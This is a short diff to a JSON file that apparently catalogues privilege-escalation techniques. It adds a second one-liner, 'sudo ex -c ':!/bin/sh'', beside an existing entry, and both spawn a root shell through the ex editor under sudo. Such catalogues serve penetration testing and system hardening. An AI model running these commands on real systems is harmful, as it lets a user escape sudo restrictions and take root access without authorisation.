@@ -22,6 +22,10 @@
       {
         
         "code": "sudo ex\n!/bin/sh\n"
+      },
+      {
+        "description": "",
+        "code": "sudo ex -c ':!/bin/sh'\n"
       }
     ]
   }
